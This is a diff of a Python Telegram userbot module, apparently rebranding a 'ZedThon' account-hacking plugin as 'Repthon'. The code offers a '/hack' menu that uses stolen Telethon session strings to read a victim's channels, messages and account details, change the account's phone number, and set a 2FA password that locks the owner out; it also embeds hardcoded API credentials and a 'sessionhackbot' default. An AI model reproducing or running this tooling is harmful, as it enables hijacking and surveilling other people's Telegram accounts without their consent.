@@ -14,13 +14,13 @@ import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
-from zthon import zedub, bot
+from userbot import bot
 
-from ..Config import Config
+from Config import Config
 
 bot = borg = tgbot
 
-Bot_Username = Config.TG_BOT_USERNAME or "sessionhackbot"
+Bot_Username = Config.BOT_USERNAME or "sessionhackbot"
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -78,7 +78,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('zedthon')
+      await X.edit_2fa('Repthon')
       return True
     except:
       return False
@@ -155,7 +155,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "zedthon"
+channel = "Repthon"
 menu = '''
 
 A  ➠   ** تحقق من قنوات ومجموعات الحساب **
@@ -186,7 +186,7 @@ M  ➠  ** تغييـر رقـم هـاتف الحسـاب **
 
 '''
 mm = '''
-**- عليك الانضمـام في قنـاة السـورس اولاً**  @ZedThon
+**- عليك الانضمـام في قنـاة السـورس اولاً**  @Repthon
 '''
 
 keyboard = [
@@ -211,22 +211,24 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZedThon")
+    Button.url("𝗥𝗲𝗽𝘁𝗵𝗼𝗻™ 𓅛", "https://t.me/Repthon")
     ]
 ]
 
 
 
-@zedub.zed_cmd(pattern="هاك$")
+@bot.on(admin_cmd(pattern="هاك$"))
+@bot.on(sudo_cmd(pattern="هاك$", allow_sudo=True))
 async def op(event):
-    zelzal = Bot_Username.replace("@","")       
-    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")
+    baqir = Bot_Username.replace("@","")       
+    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{baqir} \n- وارسـال الامر /hack**")
 
 
-@zedub.zed_cmd(pattern="اختراق$")
+@bot.on(admin_cmd(pattern="اختراق$"))
+@bot.on(sudo_cmd(pattern="اختراق$", allow_sudo=True))  
 async def op(event):
-    zelzal = Bot_Username.replace("@","")       
-    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")
+    baqir = Bot_Username.replace("@","")       
+    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{baqir} \n- وارسـال الأمر /hack**")
 
  
 @tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
@@ -256,7 +258,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZedThon")
+            Button.url("𝗥𝗲𝗽𝘁𝗵𝗼𝗻™ 𓅛", "https://t.me/Repthon")
             ]
         ]
         await x.send_message(f"**- مرحبـاً بـك عـزيـزي\n- اليـك قائمـة اوامـر اختـراق الحسـاب عبـر كـود سيشـن تيرمكـس\n- اضغـط احـد الازرار للبـدء** \n\n{menu}", buttons=keyboard)
@@ -278,12 +280,12 @@ async def users(event):
         return await event.reply("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\n**- بواسطـة زدثــون @ZedThon**")
+        file.write(i + "\n\n**- بواسطـة ريبـــثون @Repthon**")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️** \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس ريبـــثون ❤️** \n/hack", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
@@ -297,7 +299,7 @@ async def users(event):
     else:
       return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس ريبـــثون ❤️**\n/hack", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
@@ -327,7 +329,7 @@ async def users(event):
       else:
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**", buttons=keyboard)
+      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس ريبـــثون ❤️**", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -499,7 +501,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("قنـاة السـورس", "https://t.me/ZedThon")
+        Button.url("قنـاة السـورس", "https://t.me/Repthon")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
